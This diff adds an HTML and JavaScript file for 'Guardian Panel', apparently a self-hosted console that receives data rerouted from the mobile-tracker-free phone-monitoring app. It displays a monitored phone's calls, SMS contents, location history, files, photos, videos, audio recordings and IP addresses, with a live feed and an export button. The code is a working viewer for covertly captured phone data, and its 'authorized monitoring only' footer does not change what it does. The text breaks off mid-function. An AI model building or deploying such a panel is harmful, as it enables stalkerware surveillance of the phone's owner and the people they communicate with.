@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Guardian Panel — Your Private Monitor</title>
+<style>
+:root {
+  --bg: #070b14;
+  --bg2: #0c1220;
+  --card: #111a2e;
+  --card2: #16203a;
+  --line: #223052;
+  --txt: #e6edf7;
+  --muted: #8b9bb8;
+  --accent: #4f8cff;
+  --accent2: #22d3ee;
+  --ok: #34d399;
+  --warn: #fbbf24;
+  --bad: #f87171;
+  --r: 14px;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html { font-size: 15px; }
+body {
+  font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+  background: radial-gradient(1200px 600px at 80% -10%, #14224a 0%, transparent 55%),
+              radial-gradient(900px 500px at -10% 110%, #0d2b3f 0%, transparent 50%),
+              var(--bg);
+  color: var(--txt);
+  min-height: 100vh;
+}
+a { color: var(--accent2); text-decoration: none; }
+
+/* ---------- Topbar ---------- */
+.topbar {
+  position: sticky; top: 0; z-index: 50;
+  display: flex; align-items: center; gap: 14px;
+  padding: 12px 20px;
+  background: rgba(10, 15, 28, 0.82);
+  backdrop-filter: blur(14px);
+  border-bottom: 1px solid var(--line);
+}
+.logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 1.1rem; }
+.logo .shield {
+  width: 36px; height: 36px; border-radius: 11px;
+  background: linear-gradient(135deg, var(--accent), var(--accent2));
+  display: flex; align-items: center; justify-content: center;
+  font-size: 1.1rem; box-shadow: 0 4px 18px rgba(79,140,255,.35);
+}
+.live-dot {
+  display: inline-flex; align-items: center; gap: 7px;
+  font-size: .72rem; font-weight: 700; letter-spacing: .8px;
+  padding: 5px 12px; border-radius: 999px;
+  background: rgba(52,211,153,.12); color: var(--ok); border: 1px solid rgba(52,211,153,.4);
+}
+.live-dot .pulse { width: 8px; height: 8px; border-radius: 50%; background: var(--ok); animation: pulse 1.6s infinite; }
+@keyframes pulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: .4; transform: scale(.8); } }
+.auto-toggle {
+  margin-left: auto; display: flex; align-items: center; gap: 8px;
+  font-size: .78rem; color: var(--muted); cursor: pointer; user-select: none;
+}
+.switch { width: 38px; height: 20px; border-radius: 999px; background: var(--line); position: relative; transition: .2s; }
+.switch::after { content: ''; position: absolute; top: 3px; left: 3px; width: 14px; height: 14px; border-radius: 50%; background: var(--muted); transition: .2s; }
+.switch.on { background: rgba(79,140,255,.5); }
+.switch.on::after { left: 21px; background: #fff; }
+
+/* ---------- Layout ---------- */
+.wrap { max-width: 1280px; margin: 0 auto; padding: 22px 20px 60px; }
+.hero { margin: 10px 0 24px; }
+.hero h1 { font-size: 1.55rem; font-weight: 800; letter-spacing: -.3px; }
+.hero h1 span { background: linear-gradient(90deg, var(--accent), var(--accent2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+.hero p { color: var(--muted); font-size: .88rem; margin-top: 6px; }
+
+.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 14px; margin-bottom: 26px; }
+.stat {
+  background: linear-gradient(180deg, var(--card), var(--card2));
+  border: 1px solid var(--line); border-radius: var(--r);
+  padding: 16px 18px; position: relative; overflow: hidden;
+  transition: transform .18s, border-color .18s;
+}
+.stat:hover { transform: translateY(-3px); border-color: #345183; }
+.stat .num { font-size: 1.9rem; font-weight: 800; letter-spacing: -.5px; }
+.stat .lbl { font-size: .72rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 3px; }
+.stat .ic { position: absolute; right: 12px; top: 12px; font-size: 1.2rem; opacity: .85; }
+.stat.c-total .num { color: var(--accent); }
+.stat.c-media .num { color: #f472b6; }
+.stat.c-calls .num { color: var(--ok); }
+.stat.c-sms .num { color: var(--accent2); }
+.stat.c-loc .num { color: var(--warn); }
+.stat.c-files .num { color: #c084fc; }
+
+/* ---------- Tabs ---------- */
+.tabs { display: flex; gap: 8px; overflow-x: auto; padding: 4px 2px 12px; scrollbar-width: none; }
+.tabs::-webkit-scrollbar { display: none; }
+.tab {
+  flex: 0 0 auto; padding: 9px 18px; border-radius: 999px;
+  border: 1px solid var(--line); background: var(--card);
+  color: var(--muted); font-weight: 600; font-size: .84rem; cursor: pointer;
+  transition: .18s; white-space: nowrap;
+}
+.tab:hover { color: var(--txt); border-color: #345183; }
+.tab.on {
+  background: linear-gradient(135deg, var(--accent), var(--accent2));
+  color: #06121f; border-color: transparent; box-shadow: 0 4px 16px rgba(79,140,255,.3);
+}
+.tab .cnt { font-size: .7rem; opacity: .75; margin-left: 5px; }
+
+/* ---------- Sections / Cards ---------- */
+.panel { display: none; animation: fadein .25s ease; }
+.panel.on { display: block; }
+@keyframes fadein { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: none; } }
+.head { display: flex; align-items: center; gap: 12px; margin: 8px 0 16px; flex-wrap: wrap; }
+.head h2 { font-size: 1.08rem; font-weight: 700; }
+.head .sub { color: var(--muted); font-size: .8rem; }
+.spacer { margin-left: auto; display: flex; gap: 8px; flex-wrap: wrap; }
+
+.btn {
+  padding: 8px 15px; border-radius: 10px; border: 1px solid var(--line);
+  background: var(--card); color: var(--txt); font-weight: 600; font-size: .8rem;
+  cursor: pointer; transition: .15s; display: inline-flex; align-items: center; gap: 6px;
+}
+.btn:hover { border-color: var(--accent); transform: translateY(-1px); }
+.btn.primary { background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #06121f; border: none; }
+.btn.danger { background: rgba(248,113,113,.12); color: var(--bad); border-color: rgba(248,113,113,.4); }
+.btn.danger:hover { background: rgba(248,113,113,.22); }
+
+.notice {
+  display: flex; gap: 10px; align-items: flex-start;
+  border-radius: var(--r); padding: 13px 16px; font-size: .82rem; line-height: 1.5;
+  margin-bottom: 12px; border: 1px solid;
+}
+.notice.green { background: rgba(52,211,153,.08); border-color: rgba(52,211,153,.3); color: #a7f3d0; }
+.notice.amber { background: rgba(251,191,36,.08); border-color: rgba(251,191,36,.3); color: #fde68a; }
+
+/* ---------- Tables ---------- */
+.tablewrap { border: 1px solid var(--line); border-radius: var(--r); overflow: auto; background: rgba(12,18,32,.6); }
+table { width: 100%; border-collapse: collapse; min-width: 640px; }
+th { position: sticky; top: 0; background: #101a30; color: var(--muted); font-size: .68rem; text-transform: uppercase; letter-spacing: 1px; padding: 11px 14px; text-align: left; border-bottom: 1px solid var(--line); }
+td { padding: 11px 14px; border-bottom: 1px solid rgba(34,48,82,.5); font-size: .82rem; vertical-align: top; }
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: rgba(79,140,255,.05); }
+.mono { font-family: ui-monospace, 'Cascadia Mono', Consolas, monospace; font-size: .76rem; }
+.muted { color: var(--muted); }
+.clip { max-width: 320px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.clip:hover { white-space: normal; word-break: break-all; }
+
+.tag { display: inline-block; padding: 3px 9px; border-radius: 6px; font-size: .66rem; font-weight: 800; letter-spacing: .5px; text-transform: uppercase; }
+.tag.sms { background: rgba(34,211,238,.14); color: var(--accent2); }
+.tag.mms { background: rgba(192,132,252,.14); color: #c084fc; }
+.tag.call-in { background: rgba(52,211,153,.14); color: var(--ok); }
+.tag.call-out { background: rgba(79,140,255,.14); color: var(--accent); }
+.tag.call-miss { background: rgba(248,113,113,.14); color: var(--bad); }
+.tag.call { background: rgba(139,155,184,.14); color: var(--muted); }
+.tag.img { background: rgba(244,114,182,.14); color: #f472b6; }
+.tag.audio { background: rgba(79,140,255,.14); color: var(--accent); }
+.tag.video { background: rgba(251,191,36,.14); color: var(--warn); }
+.tag.file { background: rgba(192,132,252,.14); color: #c084fc; }
+.tag.loc { background: rgba(251,191,36,.14); color: var(--warn); }
+.tag.other { background: rgba(139,155,184,.14); color: var(--muted); }
+
+/* ---------- Media grid ---------- */
+.mgrid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 14px; }
+.mcard {
+  background: var(--card); border: 1px solid var(--line); border-radius: var(--r);
+  overflow: hidden; transition: .18s;
+}
+.mcard:hover { border-color: #345183; transform: translateY(-3px); }
+.mthumb { height: 120px; background: #0a1122; display: flex; align-items: center; justify-content: center; position: relative; }
+.mthumb img, .mthumb video { width: 100%; height: 100%; object-fit: cover; display: block; }
+.mthumb .big { font-size: 2.2rem; opacity: .5; }
+.mbody { padding: 10px 12px; }
+.mname { font-size: .76rem; font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.mmeta { font-size: .68rem; color: var(--muted); margin-top: 4px; display: flex; gap: 8px; align-items: center; }
+
+/* ---------- Live feed ---------- */
+.feed { display: flex; flex-direction: column; gap: 8px; }
+.fitem {
+  display: flex; gap: 12px; align-items: center;
+  background: var(--card); border: 1px solid var(--line);
+  border-left: 3px solid var(--accent2);
+  border-radius: 10px; padding: 10px 14px; font-size: .8rem;
+  animation: slidein .3s ease;
+}
+@keyframes slidein { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: none; } }
+.fitem .t { color: var(--muted); font-family: ui-monospace, monospace; font-size: .72rem; white-space: nowrap; }
+.fitem .p { font-family: ui-monospace, monospace; color: var(--accent2); font-size: .76rem; }
+
+/* ---------- Endpoint coverage ---------- */
+.epgrid { display: grid; grid-template-columns: repeat(auto-fill, minmax(230px, 1fr)); gap: 8px; }
+.ep {
+  display: flex; justify-content: space-between; gap: 8px; align-items: center;
+  background: var(--card); border: 1px solid var(--line); border-radius: 10px;
+  padding: 8px 12px; font-size: .74rem;
+}
+.ep .n { font-family: ui-monospace, monospace; color: var(--txt); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.ep .c { color: var(--accent2); font-weight: 700; font-size: .72rem; }
+
+/* ---------- Search ---------- */
+.search {
+  width: 100%; max-width: 420px; padding: 9px 14px; border-radius: 10px;
+  border: 1px solid var(--line); background: var(--card); color: var(--txt);
+  font-size: .84rem; outline: none; margin-bottom: 14px;
+}
+.search:focus { border-color: var(--accent); }
+.empty { text-align: center; padding: 50px 20px; color: var(--muted); }
+.empty .big { font-size: 2.4rem; margin-bottom: 10px; opacity: .6; }
+.empty h3 { color: var(--txt); font-size: .95rem; margin-bottom: 6px; }
+.empty p { font-size: .8rem; }
+
+footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30px 0 10px; }
+@media (max-width: 640px) {
+  .hero h1 { font-size: 1.25rem; }
+  .stat .num { font-size: 1.5rem; }
+  .topbar { padding: 10px 14px; }
+}
+</style>
+</head>
+<body>
+
+<nav class="topbar">
+  <div class="logo"><div class="shield">🛡️</div> Guardian Panel</div>
+  <div class="live-dot"><span class="pulse"></span>LIVE</div>
+  <label class="auto-toggle" onclick="toggleAuto()">
+    Auto <div class="switch on" id="autosw"></div>
+  </label>
+</nav>
+
+<div class="wrap">
+  <div class="hero">
+    <h1>Your <span>Private Monitoring</span> Server</h1>
+    <p>Saara data sirf tumhare apne server pe aata hai. Vendor ko kuch nahi jaata. 🔒</p>
+  </div>
+
+  <div class="stats">
+    <div class="stat c-total"><div class="ic">📡</div><div class="num" id="s-total">0</div><div class="lbl">Total Events</div></div>
+    <div class="stat c-media"><div class="ic">📷</div><div class="num" id="s-media">0</div><div class="lbl">Media</div></div>
+    <div class="stat c-calls"><div class="ic">📞</div><div class="num" id="s-calls">0</div><div class="lbl">Calls</div></div>
+    <div class="stat c-sms"><div class="ic">💬</div><div class="num" id="s-sms">0</div><div class="lbl">SMS / MMS</div></div>
+    <div class="stat c-loc"><div class="ic">📍</div><div class="num" id="s-loc">0</div><div class="lbl">Location</div></div>
+    <div class="stat c-files"><div class="ic">📁</div><div class="num" id="s-files">0</div><div class="lbl">Files</div></div>
+  </div>
+
+  <div class="tabs" id="tabs">
+    <button class="tab on" data-p="dashboard">📊 Dashboard</button>
+    <button class="tab" data-p="media">📷 Media <span class="cnt" id="t-media"></span></button>
+    <button class="tab" data-p="calls">📞 Calls <span class="cnt" id="t-calls"></span></button>
+    <button class="tab" data-p="sms">💬 SMS <span class="cnt" id="t-sms"></span></button>
+    <button class="tab" data-p="location">📍 Location <span class="cnt" id="t-loc"></span></button>
+    <button class="tab" data-p="files">📁 Files <span class="cnt" id="t-files"></span></button>
+    <button class="tab" data-p="live">📺 Live</button>
+    <button class="tab" data-p="all">📋 All Requests <span class="cnt" id="t-all"></span></button>
+  </div>
+
+  <!-- DASHBOARD -->
+  <section class="panel on" id="p-dashboard">
+    <div class="notice green">✅ <div><b>Secure:</b> Ye data tumhare apne Cloudflare Worker pe store hua hai. Original vendor (mobile-tracker-free) ka server is data ko kahin nahi bhej raha.</div></div>
+    <div class="notice amber">⚠️ <div><b>Reminder:</b> Data memory mein hota hai. Permanent storage ke liye <b>KV namespace</b> banao aur worker config mein lagao — tab media files bhi save hongi.</div></div>
+    <div class="head">
+      <h2>Quick Actions</h2>
+      <div class="spacer">
+        <button class="btn primary" onclick="refresh()">🔄 Refresh Now</button>
+        <button class="btn" onclick="exportJSON()">💾 Export JSON</button>
+        <button class="btn danger" onclick="clearAll()">🗑️ Clear All</button>
+      </div>
+    </div>
+    <div class="head" style="margin-top:22px;"><h2>Endpoint Coverage</h2><span class="sub">Kaunsa endpoint kitni baar hit hua</span></div>
+    <div class="epgrid" id="epgrid"></div>
+    <div class="head" style="margin-top:22px;"><h2>Last Activity</h2><span class="sub" id="lastact">—</span></div>
+  </section>
+
+  <!-- MEDIA -->
+  <section class="panel" id="p-media">
+    <div class="head">
+      <h2>📷 Media Files</h2>
+      <div class="spacer">
+        <button class="btn" data-mfilter="all" onclick="setMediaFilter('all', this)">All</button>
+        <button class="btn" data-mfilter="image" onclick="setMediaFilter('image', this)">🖼️ Images</button>
+        <button class="btn" data-mfilter="video" onclick="setMediaFilter('video', this)">🎬 Video</button>
+        <button class="btn" data-mfilter="audio" onclick="setMediaFilter('audio', this)">🎙️ Audio</button>
+      </div>
+    </div>
+    <div id="media-kv-note"></div>
+    <div class="mgrid" id="mgrid"></div>
+  </section>
+
+  <!-- CALLS -->
+  <section class="panel" id="p-calls">
+    <div class="head"><h2>📞 Call Logs</h2></div>
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>Time</th><th>Type</th><th>Number</th><th>Name</th><th>Duration</th><th>Raw Data</th></tr></thead>
+        <tbody id="tb-calls"></tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- SMS -->
+  <section class="panel" id="p-sms">
+    <div class="head"><h2>💬 SMS / MMS</h2></div>
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>Time</th><th>Type</th><th>Number</th><th>Message</th><th>Endpoint</th></tr></thead>
+        <tbody id="tb-sms"></tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- LOCATION -->
+  <section class="panel" id="p-location">
+    <div class="head"><h2>📍 Location History</h2></div>
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>Time</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Address</th><th>Map</th></tr></thead>
+        <tbody id="tb-loc"></tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- FILES -->
+  <section class="panel" id="p-files">
+    <div class="head"><h2>📁 File Explorer</h2></div>
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>Time</th><th>File Name</th><th>Path</th><th>Size</th><th>Endpoint</th></tr></thead>
+        <tbody id="tb-files"></tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- LIVE -->
+  <section class="panel" id="p-live">
+    <div class="head"><h2>📺 Live Feed</h2><span class="sub">Har naya event yahan turant dikhega</span></div>
+    <div class="feed" id="feed"></div>
+  </section>
+
+  <!-- ALL -->
+  <section class="panel" id="p-all">
+    <div class="head"><h2>📋 All Requests</h2></div>
+    <input class="search" id="search" placeholder="🔍 Search endpoint, number, text..." oninput="renderAll()">
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>Time</th><th>Endpoint</th><th>Type</th><th>Data</th><th>IP</th></tr></thead>
+        <tbody id="tb-all"></tbody>
+      </table>
+    </div>
+  </section>
+
+  <footer>🛡️ Guardian Panel — Self-hosted. Sirf authorized monitoring ke liye.</footer>
+</div>
+
+<script>
+"use strict";
+var DATA = [];
+var auto = true;
+var mediaFilter = "all";
+var timer = null;
+
+function esc(s) {
+  return String(s == null ? "" : s)
+    .split("&").join("&amp;").split("<").join("&lt;").split(">").join("&gt;")
+    .split('"').join("&quot;").split("'").join("&#39;");
+}
+
+function fmtTime(iso) {
+  try { return new Date(iso).toLocaleString(); } catch (e) { return String(iso); }
+}
+function fmtSize(n) {
+  if (!n) return "—";
+  if (n < 1024) return n + " B";
+  if (n < 1048576) return (n / 1024).toFixed(1) + " KB";
+  return (n / 1048576).toFixed(1) + " MB";
+}
+
+/* ---------- classification ---------- */
+function kindOf(p) {
+  p = String(p || "").toLowerCase();
+  if (p.indexOf("sms") >= 0) return "sms";
+  if (p.indexOf("mms") >= 0) return "mms";
+  if (p.indexOf("call") >= 0) return "call";
+  if (p.indexOf("picture") >= 0 || p.indexOf("screenshot") >= 0) return "img";
+  if (p.indexOf("video") >= 0) return "video";
+  if (p.indexOf("recordaudio") >= 0 || p.indexOf("audio") >= 0) return "audio";
+  if (p.indexOf("location") >= 0 || p.indexOf("loclive") >= 0) return "loc";
+  if (p.indexOf("fileexplorer") >= 0) return "file";
+  return "other";
+}
+function isMedia(k) { return k === "img" || k === "video" || k === "audio"; }
+
+function getF(c) {
+  if (c.files && c.files.length) return c.files[0];
+  return null;
+}
+function mediaKind(c) {
+  var k = kindOf(c.path);
+  if (isMedia(k)) return k;
+  var f = getF(c);
+  if (f && f.mimetype) {
+    if (f.mimetype.indexOf("image") === 0) return "img";
+    if (f.mimetype.indexOf("video") === 0) return "video";
+    if (f.mimetype.indexOf("audio") === 0) return "audio";
+  }
+  return null;
+}
+
+/* ---------- data ---------- */
+function refresh() {
+  return fetch("/api/captures", { cache: "no-store" })
+    .then(function (r) { return r.json(); })
+    .then(function (j) {
+      if (Array.isArray(j)) { DATA = j; renderAll(); }
+    })
+    .catch(function (e) { console.error("load fail", e); });
+}
+function toggleAuto() {
+  auto = !auto;
+  document.getElementById("autosw").className = "switch" + (auto ? " on" : "");
+  if (auto) startTimer(); else stopTimer();
+}
+function startTimer() {
+  stopTimer();
+  timer = setInterval(refresh, 5000);
+}
+function stopTimer() { if (timer) { clearInterval(timer); timer = null; } }
+
+function clearAll() {
+  if (!confirm("Sab records delete? Wapas nahi aayenge.")) return;
+  fetch("/api/clear", { method: "POST" }).then(function () {
+    DATA = []; renderAll();
+  });
+}
+function exportJSON() {
+  var blob = new Blob([JSON.stringify(DATA, null, 2)], { type: "application/json" });
+  var a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "guardian-data.json";
+  a.click();
+}
+
+/* ---------- rendering ---------- */
+function renderAll() {
+  var k, counts = { total: DATA.length, media: 0, calls: 0, sms: 0, loc: 0, files: 0, other: 0 };
+  var byKind = { media: [], calls: [], sms: [], loc: [], files: [], other: [] };
+  var epCounts = {};
+  DATA.forEach(function (c) {
+    var k = kindOf(c.path);
+    if (isMedia(k)) { counts.media++; byKind.media.push(c); }
+    else if (k === "sms" || k === "mms") { counts.sms++; byKind.sms.push(c); }
+    else if (k === "call") { counts.calls++; byKind.calls.push(c); }
+    else if (k === "loc") { counts.loc++; byKind.loc.push(c); }
+    else if (k === "file") { counts.files++; byKind.files.push(c); }
+    else { counts.other++; byKind.other.push(c); }
+    epCounts[c.path] = (epCounts[c.path] || 0) + 1;
+  });
+
+  set("s-total", counts.total); set("s-media", counts.media); set("s-calls", counts.calls);
+  set("s-sms", counts.sms); set("s-loc", counts.loc); set("s-files", counts.files);
+  set("t-media", counts.media || ""); set("t-calls", counts.calls || ""); set("t-sms", counts.sms || "");
+  set("t-loc", counts.loc || ""); set("t-files", counts.files || ""); set("t-all", counts.total || "");
+
+  if (DATA.length) set("lastact", "Latest: " + fmtTime(DATA[0].time));
+
+  renderEps(epCounts);
+  renderMedia(byKind.media);
+  renderCalls(byKind.calls);
+  renderSMS(byKind.sms);
+  renderLoc(byKind.loc);
+  renderFiles(byKind.files);
+  renderLive();
+  renderAllTable();
+}
+
+function set(id, v) { var el = document.getElementById(id); if (el) el.textContent = v; }
+
+function renderEps(epCounts) {
+  var keys = Object.keys(epCounts).sort();
+  var g = document.getElementById("epgrid");
+  if (!keys.length) { g.innerHTML = '<div class="empty" style="grid-column:1/-1"><div class="big">📡</div><h3>Abhi koi request nahi aayi</h3><p>APK install hone ke baad data yahan dikhega.</p></div>'; return; }
+  g.innerHTML = keys.map(function (p) {
+    return '<div class="ep"><span class="n">' + esc(p) + '</span><span class="c">×' + epCounts[p] + '</span></div>';
+  }).join("");
+}
+
+function renderMedia(list) {
+  var g = document.getElementById("mgrid");
+  var note = document.getElementById("media-kv-note");
+  var noKv = list.some(function (c) { var f = getF(c); return f && !f.fileKey; });
+  note.innerHTML = noKv
+    ? '<div class="notice amber">💡 <div><b>File preview off hai:</b> KV namespace connect nahi hai, isliye sirf metadata dikh raha hai. Cloudflare dashboard mein KV banao aur <span class="mono">KV_DATA</span> binding lagao — images/videos inline dikhne lagenge.</div></div>'
+    : "";
+  var filtered = list.filter(function (c) {
+    if (mediaFilter === "all") return true;
+    return mediaKind(c) === mediaFilter;
+  });
+  if (!filtered.length) { g.innerHTML = '<div class="empty" style="grid-column:1/-1"><div class="big">📷</div><h3>No media yet</h3><p>Photos, videos aur recordings yahan dikhengi.</p></div>'; return; }
+  g.innerHTML = filtered.map(function (c) {
+    var f = getF(c);
+    var mk = mediaKind(c) || "file";
+    var label = mk === "img" ? "IMAGE" : mk === "video" ? "VIDEO" : mk === "audio" ? "AUDIO" : "FILE";
+    var thumb;
+    if (f && f.fileKey) {
+      var url = "/api/file/" + encodeURIComponent(f.fileKey);
+      if (mk === "img") thumb = '<img src="' + url + '" alt="" loading="lazy">';
+      else if (mk === "video") thumb = '<video src="' + url + '" controls preload="metadata"></video>';
+      else if (mk === "audio") thumb = '<div class="big">🎙️</div>';
+      else thumb = '<div class="big">📄</div>';
+    } else {
+      var ic = mk === "img" ? "🖼️" : mk === "video" ? "🎬" : mk === "audio" ? "🎙️" : "📄";
+      thumb = '<div class="big">' + ic + '</div>';
+    }
+    var name = (f && f.name) || (String(c.path).split("/").pop() || "unknown");
+    return '<div class="mcard"><div class="mthumb">' + thumb + '</div><div class="mbody">'
+      + '<div class="mname" title="' + esc(name) + '">' + esc(name) + '</div>'
+      + '<div class="mmeta"><span class="tag ' + mk + '">' + label + '</span><span>' + fmtSize(f && f.size) + '</span></div>'
+      + '<div class="mmeta">' + fmtTime(c.time) + '</div>'
+      + (f && f.fileKey && mk === "audio" ? '<audio style="width:100%;margin-top:6px" controls src="/api/file/' + encodeURIComponent(f.fileKey) + '"></audio>' : "")
+      + '</div></div>';
+  }).join("");
+}
+
+function renderCalls(list) {
+  var tb = document.getElementById("tb-calls");
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="6" class="empty"><div class="big">📞</div><h3>No calls yet</h3></td></tr>'; return; }
+  tb.innerHTML = list.map(function (c) {
+    var f = c.fields || {};
+    var type = String(f.type || f.callType || "").toLowerCase();
+    var tag = "call", label = "CALL";
+    if (type.indexOf("in") >= 0 && type.indexOf("out") < 0) { tag = "call-in"; label = "INCOMING"; }
+    else if (type.indexOf("out") >= 0) { tag = "call-out"; label = "OUTGOING"; }
+    else if (type.indexOf("miss") >= 0 || type === "3") { tag = "call-miss"; label = "MISSED"; }
+    return '<tr><td class="mono muted">' + fmtTime(c.time) + '</td>'
+      + '<td><span class="tag ' + tag + '">' + label + '</span></td>'
+      + '<td class="mono">' + esc(f.number || f.phoneNumber || "—") + '</td>'
+      + '<td>' + esc(f.name || f.contact || "—") + '</td>'
+      + '<td class="mono">' + esc(f.duration || f.data || "—") + '</td>'
+      + '<td class="mono muted clip">' + esc(JSON.stringify(f)).slice(0, 120) + '</td></tr>';
+  }).join("");
+}
+
+function renderSMS(list) {
+  var tb = document.getElementById("tb-sms");
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="5" class="empty"><div class="big">💬</div><h3>No SMS yet</h3></td></tr>'; return; }
+  tb.innerHTML = list.map(function (c) {
+    var f = c.fields || {};
+    var k = kindOf(c.path);
+    return '<tr><td class="mono muted">' + fmtTime(c.time) + '</td>'
+      + '<td><span class="tag ' + (k === "mms" ? "mms" : "sms") + '">' + (k === "mms" ? "MMS" : "SMS") + '</span></td>'
+      + '<td class="mono">' + esc(f.number || f.address || "—") + '</td>'
+      + '<td class="clip">' + esc(f.data || f.body || f.message || "—") + '</td>'
+      + '<td class="mono muted">' + esc(c.path) + '</td></tr>';
+  }).join("");
+}
+
+function renderLoc(list) {
+  var tb = document.getElementById("tb-loc");
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="6" class="empty"><div class="big">📍</div><h3>No location yet</h3></td></tr>'; return; }
+  tb.innerHTML = list.map(function (c) {
+    var f = c.fields || {};
+    var lat = f.latitude || f.lat, lng = f.longitude || f.lng;
+    var mapLink = (lat && lng && lat !== "0" && lng !== "0")
+      ? '<a href="https://maps.google.com/?q=' + encodeURIComponent(lat + "," + lng) + '" target="_blank">Open 🗺️</a>' : "—";
+    return '<tr><td class="mono muted">' + fmtTime(c.time) + '</td>'
+      + '<td class="mono">' + esc(lat || "—") + '</td>'
+      + '<td class="mono">' + esc(lng || "—") + '</td>'
+      + '<td class="mono">' + esc(f.accuracy || "—") + '</td>'
+      + '<td class="clip">' + esc(f.address || "—") + '</td>'
+      + '<td>' + mapLink + '</td></tr>';
+  }).join("");
+}
+
+function renderFiles(list) {
+  var tb = document.getElementById("tb-files");
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="5" class="empty"><div class="big">📁</div><h3>No files yet</h3></td></tr>'; return; }
+  tb.innerHTML = list.map(function (c) {
+    var f = c.fields || {};
+    var fl = getF(c);
+    return '<tr><td class="mono muted">' + fmtTime(c.time) + '</td>'
+      + '<td class="mono">' + esc(f.nameFile || (fl && fl.name) || "—") + '</td>'
+      + '<td class="mono muted clip">' + esc(f.pathFile || "—") + '</td>'
+      + '<td class="mono">' + fmtSize(fl && fl.size) + '</td>'
+      + '<td class="mono muted">' + esc(c.path) + '</td></tr>';
+  }).join("");
+}
+
+function renderLive() {
+  var fd = document.getElementById("feed");
+  var recent = DATA.slice(0, 10);
+  if (!recent.length) { fd.innerHTML = '<div class="empty"><div class="big">📺</div><h3>Waiting for events...</h3><p>Device connect hone pe live feed yahan chalega.</p></div>'; return; }
+  fd.innerHTML = recent.map(function (c) {
+    return '<div class="fitem"><span class="t">' + fmtTime(c.time) + '</span><span class="p">' + esc(c.path) + '</span></div>';
+  }).join("");
+}
+
+function renderAllTable() {
+  var tb = document.getElementById("tb-all");
+  var q = String((document.getElementById("search") || {}).value || "").toLowerCase();
+  var list = DATA;
+  if (q) {
+    list = DATA.filter(function (c) {
+      var hay = (c.path + " " + JSON.stringify(c.fields || {}) + " " + (c.ip || "")).toLowerCase();
+      return hay.indexOf(q) >= 0;
+    });
+  }
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="5" class="empty"><div class="big">📋</div><h3>' + (q ? "No match" : "No requests yet") + '</h3></td></tr>'; return; }
+  tb.innerHTML = list.slice(0, 500).map(function (c) {
+    var k = kindOf(c.path);
+    return '<tr><td class="mono muted">' + fmtTime(c.time) + '</td>'
+      + '<td class="mono" style="color:var(--accent2)">' + esc(c.path) + '</td>'
+      + '<td><span class="tag ' + (isMedia(k) ? k : k) + '">' + k.toUpperCase() + '</span></td>'
+      + '<td class="mono muted clip">' + esc(JSON.stringify(c.fields || {})).slice(0, 140) + '</td>'
+      + '<td class="mono muted">' + esc(c.ip || "—") + '</td></tr>';
+  }).join("");
+}
+
+/* ---------- tabs ---------- */
+document.getElementById("tabs").addEventListener("click", function (e) {
+  var b = e.target.closest(".tab");
+  if (!b) return;
+  document.querySelectorAll(".tab").forEach(function (t) { t.classList.remove("on"); });
+  b.classList.add("on");
+  document.querySelectorAll(".panel").forEach(function (p) { p.classList.remove("on"); });
+  document.getElementById("p-" + b.dataset.p).classList.add("on");
+});
+function setMediaFilter(k, btn) {
+  mediaFilter = k;
+  document.querySelectorAll("[data-mfilter]").forEach(function (b) { b.style.borderColor = ""; b.style.color = ""; });
+  if (btn) { btn.style.borderColor = "var(--accent)"; btn.style.color = "var(--accent2)"; }
+  var list = [];
+  DATA.forEach(function (c) { if (isMedia(kindOf(c.path))) list.push(c); });
+  var g = document.getElementById("mgrid");
+  var filtered = list.filter(function (c) { return mediaFilter === "all" || mediaKind(c) === mediaFilter; });
+  if (!filtered.length) { g.innerHTML = '<div class="empty" style="grid-column:1/-1"><div class="big">📷</div><h3>No media in this filter</h3></div>'; return; }
+  g.innerHTML = filtered.map(function (c) {
+    var f = getF(c);
+    var mk = mediaKind(c) || "file";
+    var label = mk === "img" ? "IMAGE" : mk === "video" ? "VIDEO" : mk === "audio" ? "AUDIO" : "FILE";
+    var thumb;
+    if (f && f.fileKey) {
+      var url = "/api/file/" + encodeURIComponent(f.fileKey);
+      if (mk === "img") thumb = '<img src="' + url + '" alt="" loading="lazy">';
+      else if (mk === "video") thumb = '<video src="' + url + '" controls preload="metadata"></video>';
+      else thumb = '<div class="big">🎙️</div>';
+    } else {
+      thumb = '<div class="big">' + (mk === "img" ? "🖼️" : mk === "video" ? "🎬" : "🎙️") + '</div>';
+    }
+    var name = (f && f.name) || (String(c.path).split("/").pop() || "unknown");
+    return '<div class="mcard"><div class="mthumb">' + thumb + '</div><div class="mbody">'
+      + '<div class="mname" title="' + esc(name) + '">' + esc(name) + '</div>'
